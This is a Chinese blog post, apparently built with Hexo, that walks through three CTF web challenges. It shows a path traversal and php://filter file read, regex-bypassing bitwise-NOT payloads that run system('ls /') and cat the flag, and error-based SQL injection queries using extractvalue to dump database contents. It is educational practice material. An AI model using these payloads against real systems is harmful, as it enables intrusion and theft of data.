@@ -1,0 +1,323 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>WEB刷一刷 | Ep0ch</title><meta name="author" content="Zs"><meta name="copyright" content="Zs"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="[NISACTF 2022]easyssrf提示ssrf。首先在输入栏输入flag，给出提示  那我们便使用file协议读取&#x2F;fl4g 提示如下：  访问ha1x1ux1u.php  得到一段php代码 &lt;?phphighlight_file(__FILE__);error_reporting(0);#关闭错误报告$file &#x3D; $_GET[&quot;file&quot;];#参">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB刷一刷">
+<meta property="og:url" content="http://example.com/posts/5286b664/index.html">
+<meta property="og:site_name" content="Ep0ch">
+<meta property="og:description" content="[NISACTF 2022]easyssrf提示ssrf。首先在输入栏输入flag，给出提示  那我们便使用file协议读取&#x2F;fl4g 提示如下：  访问ha1x1ux1u.php  得到一段php代码 &lt;?phphighlight_file(__FILE__);error_reporting(0);#关闭错误报告$file &#x3D; $_GET[&quot;file&quot;];#参">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/web.jpg">
+<meta property="article:published_time" content="2024-08-10T03:08:57.000Z">
+<meta property="article:modified_time" content="2024-08-10T03:10:59.343Z">
+<meta property="article:author" content="Zs">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/web.jpg"><link rel="shortcut icon" href="/img/index.jpg"><link rel="canonical" href="http://example.com/posts/5286b664/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: Zs","link":"链接: ","source":"来源: Ep0ch","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WEB刷一刷',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-08-10 11:10:59'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload="this.media='screen'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+document.addEventListener('pjax:send', () => {
+  Pace.restart()
+})
+</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/epoch.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/web.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Ep0ch"><img class="site-icon" src="/img/epoch.jpg#%20image"/><span class="site-name">Ep0ch</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WEB刷一刷</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-08-10T03:08:57.000Z" title="发表于 2024-08-10 11:08:57">2024-08-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-08-10T03:10:59.343Z" title="更新于 2024-08-10 11:10:59">2024-08-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/WEB/">WEB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">682</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="WEB刷一刷"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h2><p><img src="https://pic.imgdb.cn/item/66b6d4f2d9c307b7e955d34f.png"><br>提示ssrf。首先在输入栏输入flag，给出提示</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d503d9c307b7e955df14.png"></p>
+<p>那我们便使用file协议读取&#x2F;fl4g</p>
+<p>提示如下：</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d515d9c307b7e955ea67.png"></p>
+<p>访问ha1x1ux1u.php</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d528d9c307b7e955f7a0.png"></p>
+<p>得到一段php代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="comment">#关闭错误报告</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];<span class="comment">#参数名为file</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;file&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;你败了.&quot;</span>);</span><br><span class="line">&#125;<span class="comment">#如果参数的值中有file则出错，不报错则输出参数值对应文件的内容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造url：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url?file=../../../flag</span><br></pre></td></tr></table></figure>
+
+<p>使得 PHP 脚本尝试访问根目录之上三层目录中名为 <code>flag</code> 的文件。</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d541d9c307b7e9560905.png"></p>
+<p>或使用其他协议进行读取</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url?file=php://filter/read=convert.base64-encode/resource=/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/66b6d557d9c307b7e95617b7.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d56cd9c307b7e956279b.png"></p>
+<h2 id="SWPUCTF-2021-新生赛-hardrce"><a href="#SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="[SWPUCTF 2021 新生赛]hardrce"></a>[SWPUCTF 2021 新生赛]hardrce</h2><p>进入网页后代码审计</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d582d9c307b7e9563c97.png"></p>
+<p>发现题目将常用字符和大小写字母都禁止了</p>
+<p>那么试着将要传入的命令取反看看</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d598d9c307b7e9564bb8.png"></p>
+<p>运行结果：</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d5aad9c307b7e956597d.png"></p>
+<p>发现取反后出来的都是不可见字符，自然不会触发正则匹配的效果</p>
+<p>那么将取反后的效果先进行url编码后再取反传入，网站自动进行url解码后便可以绕过</p>
+<p>那么试着传入phpinfo();试试</p>
+<p>这里我们还需要注意括号的问题直接传入papinfo()的取反</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d5c0d9c307b7e956699d.png"></p>
+<p>并没有出现php的界面，所以这里我们构造payload</p>
+<p><code>payload=?wllm=(~%8F%97%8F%96%91%99%90)();</code></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d5d7d9c307b7e9567acb.png"></p>
+<p>出现了php的页面说明成功的绕过了</p>
+<p>那么接着构造system(‘ls &#x2F;‘)</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d5e9d9c307b7e95689c5.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d5fad9c307b7e95696d1.png"></p>
+<p>传入<code>payload=?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0)；</code></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d60fd9c307b7e956a658.png"></p>
+<p>发现flllllaaaaaaggggggg </p>
+<p>构造system(‘cat flllllaaaaaaggggggg &#x2F;‘)</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d61fd9c307b7e956b227.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d62fd9c307b7e956be97.png"></p>
+<p>传入<code>payload=?wllm=(~%8C%86%8C%8B%9A%92）(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</code></p>
+<p>拿到flag</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d63fd9c307b7e956ca07.png"></p>
+<h2 id="SWPUCTF-2021-新生赛-error"><a href="#SWPUCTF-2021-新生赛-error" class="headerlink" title="[SWPUCTF 2021 新生赛]error"></a>[SWPUCTF 2021 新生赛]error</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><h4 id="首先输入一些值判断闭合符号，注入类型"><a href="#首先输入一些值判断闭合符号，注入类型" class="headerlink" title="首先输入一些值判断闭合符号，注入类型"></a>首先输入一些值判断闭合符号，注入类型</h4><p><img src="https://pic.imgdb.cn/item/66b6d67dd9c307b7e956f06f.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d68cd9c307b7e956face.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d69fd9c307b7e9570a37.png"></p>
+<p>判断出使用单引号闭合，无回显但有报错提示，所以为报错注入</p>
+<h4 id="判断有多少列"><a href="#判断有多少列" class="headerlink" title="判断有多少列"></a>判断有多少列</h4><p><img src="https://pic.imgdb.cn/item/66b6d6bad9c307b7e9571ada.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d6c9d9c307b7e957269f.png"></p>
+<p>所以为3列</p>
+<h4 id="使用extractvalue-函数"><a href="#使用extractvalue-函数" class="headerlink" title="使用extractvalue()函数"></a>使用extractvalue()函数</h4><p>爆库名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select database()))),3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/66b6d6ded9c307b7e9573305.png"></p>
+<p>爆表名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>test_db<span class="string">&#x27;))),3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/66b6d6edd9c307b7e9573d14.png"></p>
+<p>爆列名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>test_tb<span class="string">&#x27;))),3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/66b6d6fcd9c307b7e95746fb.png"></p>
+<p>爆flag值</p>
+<p>第一段：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select group_concat(flag)from test_tb))),3--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/66b6d70fd9c307b7e95753e6.png"></p>
+<p>第二段：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,extractvalue(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,(select substring(group_concat(id,&#x27;</span><span class="operator">~</span><span class="string">&#x27;,flag),31,30) from test_tb)))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/66b6d71fd9c307b7e9575e2a.png"></p>
+<p>拼接得到flag</p>
+<h3 id="解法二（sqlmap）"><a href="#解法二（sqlmap）" class="headerlink" title="解法二（sqlmap）"></a>解法二（sqlmap）</h3><h4 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p><img src="https://pic.imgdb.cn/item/66b6d752d9c307b7e9577d18.png"></p>
+<p>结果：</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d76ed9c307b7e9578fb2.png"></p>
+<p>–batch 自动回答问题</p>
+<p>GET类型，可能是盲注或报错注入</p>
+<h4 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h4><p><img src="https://pic.imgdb.cn/item/66b6d781d9c307b7e9579d4e.png"></p>
+<p>结果：</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d795d9c307b7e957ab73.png"></p>
+<p>–dbs列出库名</p>
+<p>做题过程中一般只用到当前数据库</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d7add9c307b7e957d495.png"></p>
+<p><img src="https://pic.imgdb.cn/item/66b6d7c5d9c307b7e957e794.png"></p>
+<h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p><img src="https://pic.imgdb.cn/item/66b6d7d7d9c307b7e957f643.png"></p>
+<p>结果</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d7ead9c307b7e95804b5.png"></p>
+<h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p><img src="https://pic.imgdb.cn/item/66b6d7ffd9c307b7e958130c.png"></p>
+<p>结果</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d820d9c307b7e958292f.png"></p>
+<h4 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h4><p><img src="https://pic.imgdb.cn/item/66b6d831d9c307b7e95833ad.png"></p>
+<p>结果</p>
+<p><img src="https://pic.imgdb.cn/item/66b6d846d9c307b7e958429b.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Zs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/posts/5286b664/">http://example.com/posts/5286b664/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Ep0ch</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/WEB/">WEB</a></div><div class="post_share"><div class="social-share" data-image="/img/web.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/fd137f81/" title="Syetem()与Execve()的区别"><img class="cover" src="/img/pwn1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-07</div><div class="title">Syetem()与Execve()的区别</div></div></a></div><div><a href="/posts/d66b9a90/" title="BUUCTF 刮开有奖"><img class="cover" src="/img/tag.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-08</div><div class="title">BUUCTF 刮开有奖</div></div></a></div><div><a href="/posts/54d49677/" title="CISCN2023烧烤摊儿"><img class="cover" src="/img/PWNciscn.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-09</div><div class="title">CISCN2023烧烤摊儿</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/epoch.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Zs</div><div class="author-info__description">人山人海呀~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#NISACTF-2022-easyssrf"><span class="toc-number">1.</span> <span class="toc-text">[NISACTF 2022]easyssrf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce"><span class="toc-number">2.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]hardrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-error"><span class="toc-number">3.</span> <span class="toc-text">[SWPUCTF 2021 新生赛]error</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%B8%80"><span class="toc-number">3.1.</span> <span class="toc-text">解法一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E8%BE%93%E5%85%A5%E4%B8%80%E4%BA%9B%E5%80%BC%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E7%AC%A6%E5%8F%B7%EF%BC%8C%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.1.1.</span> <span class="toc-text">首先输入一些值判断闭合符号，注入类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9C%89%E5%A4%9A%E5%B0%91%E5%88%97"><span class="toc-number">3.1.2.</span> <span class="toc-text">判断有多少列</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8extractvalue-%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.3.</span> <span class="toc-text">使用extractvalue()函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%95%E4%BA%8C%EF%BC%88sqlmap%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">解法二（sqlmap）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.2.1.</span> <span class="toc-text">判断注入类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%93%E5%90%8D"><span class="toc-number">3.2.2.</span> <span class="toc-text">库名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A8%E5%90%8D"><span class="toc-number">3.2.3.</span> <span class="toc-text">表名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%97%E5%90%8D"><span class="toc-number">3.2.4.</span> <span class="toc-text">列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#flag%E5%80%BC"><span class="toc-number">3.2.5.</span> <span class="toc-text">flag值</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/ff3ef111/" title="Vulnhub靶机--AI-Web1"><img src="/img/BaJi.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" 